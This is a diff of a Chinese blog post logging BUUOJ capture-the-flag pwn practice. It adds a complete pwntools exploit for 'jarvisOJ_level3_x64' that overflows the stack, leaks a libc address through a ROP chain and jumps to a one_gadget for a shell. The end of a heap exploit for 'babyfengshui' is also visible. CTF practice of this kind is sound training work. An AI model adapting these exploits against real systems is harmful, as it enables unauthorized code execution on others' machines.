@@ -3,7 +3,7 @@ toc: true
 classes: wide
 layout: single
 title:  "Buuoj PWN 题目冲分过程2（指俯冲）"
-date:   2020-11-16 22:15:38 +0800
+date:   2021-01-03 00:10:38 +0800
 categories: 
   - pwn
 ---
@@ -13,9 +13,7 @@ categories:
 
 ## Problems
 
-### glibc heap related
-
-#### babyfengshui_33c3_2016
+### babyfengshui_33c3_2016
 
 ```python
 
@@ -106,6 +104,49 @@ Update(1, p32(system_addr) + b'zzzz')
 
 Delete(3)
 p.interactive()
+```
+
+### jarvisOJ_level3_x64
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './level3_x64'
+# p = process(filename)
+p = remote('node3.buuoj.cn', 28216)
+elf = ELF(filename)
+# libc = ELF('/home/ubuntu/glibc-2.23/lib/libc-2.23.so')
+# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+# libc = ELF('./libc/jarvisOJ_level3_x64-libc-2.19.so')
+libc = ELF('./libc/ubuntu_16_x86_64_libc-2.23.so')
+
+pop_rdi_ret = 0x00000000004006b3
+pop_rsi_r15_ret = 0x00000000004006b1
+
+log.info(f'write@plt={hex(elf.plt["write"])}, write in symbols: {hex(libc.sym["write"])}')
+
+payload = b'a'*(0x80+8) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(elf.got["write"]) + p64(0) + p64(elf.plt["write"]) + p64(elf.sym["main"])
+p.sendlineafter(b'Input:\n', payload)
+
+write_address = u64(p.recv(8))
+
+searcher = LibcSearcher()
+searcher.add_condition('write', write_address)
 
 
+base_address = write_address - libc.sym['write']
+# base_address = write_address - searcher.dump('write')
+
+# gadgets = [0x4527a, 0xf0364, 0xf1207, 0x45226]
+# gadgets = [0x4647c, 0xe5765, 0xe66bd, 0x46428]
+gadgets = [0x4526a, 0xf02a4, 0xf1147, 0x45216]
+
+one_gadget = gadgets[1] + base_address
+log.info(f'write={hex(write_address)}, libc={hex(base_address)}, gadget={hex(one_gadget)}')
+
+payload = b'a'*(0x80+8) + p64(one_gadget)
+p.sendlineafter(b'Input:\n', payload)
+p.interactive()
 ```
